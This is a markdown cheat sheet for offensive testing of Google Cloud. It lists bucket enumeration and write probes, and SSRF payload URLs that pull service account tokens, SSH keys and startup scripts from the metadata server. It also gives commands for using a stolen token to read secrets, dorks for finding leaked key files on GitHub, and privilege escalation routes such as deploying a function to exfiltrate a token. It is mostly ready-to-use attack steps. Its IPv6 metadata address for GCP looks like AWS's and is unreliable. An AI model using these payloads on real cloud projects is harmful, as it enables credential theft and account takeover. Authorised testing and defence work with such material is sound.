# GCP Security Testing

> GCP's default service account model and open metadata endpoint make it uniquely vulnerable when combined with SSRF.

---

## Recon — Finding GCP Assets

```bash
# GCS bucket discovery
python3 cloud_enum.py -k companyname --disable-aws --disable-azure

# Common bucket naming
companyname, companyname-backup, companyname-prod, companyname-dev

# Google dork
site:storage.googleapis.com "companyname"

# Direct bucket URL format
https://storage.googleapis.com/BUCKET-NAME/
https://BUCKET-NAME.storage.googleapis.com/
```

---

## GCS Bucket Testing

```bash
# Check if bucket is publicly accessible (no auth)
curl -s "https://storage.googleapis.com/storage/v1/b/BUCKET-NAME/o" | python3 -m json.tool

# List with gsutil
gsutil ls gs://BUCKET-NAME
gsutil ls -la gs://BUCKET-NAME

# Download file
gsutil cp gs://BUCKET-NAME/file.txt .

# Try write access (critical if successful)
echo "poc" | gsutil cp - gs://BUCKET-NAME/poc.txt

# Check bucket IAM policy
gsutil iam get gs://BUCKET-NAME

# Check for allUsers or allAuthenticatedUsers
gsutil iam get gs://BUCKET-NAME | grep -E "allUsers|allAuthenticatedUsers"
```

---

## SSRF → GCP Metadata

```bash
# GCP metadata endpoint (requires Metadata-Flavor header)
# Note: This header check can sometimes be bypassed

# Instance metadata
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/zone

# Service account OAuth token (the jackpot)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes

# Project info
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id

# SSH keys
http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys

# Startup scripts (often contain credentials)
http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script

# Header bypass attempts (if server validates Metadata-Flavor)
# Add header via SSRF: Metadata-Flavor: Google
# Some SSRF vulnerabilities allow header injection

# Alternative IPs
http://169.254.169.254/computeMetadata/v1/   # AWS-style endpoint also works on GCP
http://[fd00:ec2::254]/computeMetadata/v1/   # IPv6
```

---

## Using Stolen GCP Service Account Token

```bash
# Set token in environment
export GOOGLE_OAUTH_ACCESS_TOKEN="ya29...."

# Or use gcloud
gcloud config set project PROJECT-ID
gcloud auth activate-service-account --key-file=key.json

# Who am I?
gcloud auth list
curl -H "Authorization: Bearer TOKEN" \
  "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=TOKEN"

# List GCS buckets
gsutil ls

# List Compute instances
gcloud compute instances list

# List Cloud Functions
gcloud functions list

# List Cloud Run services
gcloud run services list

# List Secrets
gcloud secrets list
gcloud secrets versions access latest --secret="SECRET-NAME"

# List Service Accounts
gcloud iam service-accounts list

# List IAM bindings
gcloud projects get-iam-policy PROJECT-ID

# List Kubernetes clusters
gcloud container clusters list

# Check GCR (container registry)
gcloud container images list --repository=gcr.io/PROJECT-ID
```

---

## GCP-Specific Attack Paths

### Service Account Key Files

```bash
# Find leaked service account JSON keys
grep -r '"type": "service_account"' . -r
grep -r '"private_key_id"' . -r

# Google dork
"private_key_id" filetype:json site:github.com
"type": "service_account" site:github.com

# Activate with gcloud
gcloud auth activate-service-account --key-file=leaked_key.json
```

### Default Service Account Abuse

```bash
# GCE instances often have the default SA with broad permissions
# If SSRF on GCE → get token → check scopes

# Token scope check
curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=TOKEN" | jq .scope

# Full cloud-platform scope = very dangerous
# storage-full = all GCS access
# compute = Compute Engine access
```

### GCP Privilege Escalation

```bash
# If you have iam.serviceAccounts.actAs permission:
# Attach a higher-privilege SA to a VM or function you control

# If you have cloudfunctions.functions.create:
# Deploy a function with a high-privilege SA and exfiltrate token

# If you have iam.roles.update:
# Add permissions to existing role you have

# GCP Privesc resource
# https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
```

---

## Common GCP Misconfigurations

**Public GCS bucket with sensitive data** → Critical/High depending on content

**Default compute SA with cloud-platform scope + SSRF** → Critical

**Service account key file exposed in GitHub** → Critical

**Overpermissive IAM bindings (allUsers with roles/editor)** → Critical

**Unauthenticated Cloud Run / Cloud Functions** → High (depends on function behavior)

**GKE cluster with public endpoint and weak RBAC** → High/Critical
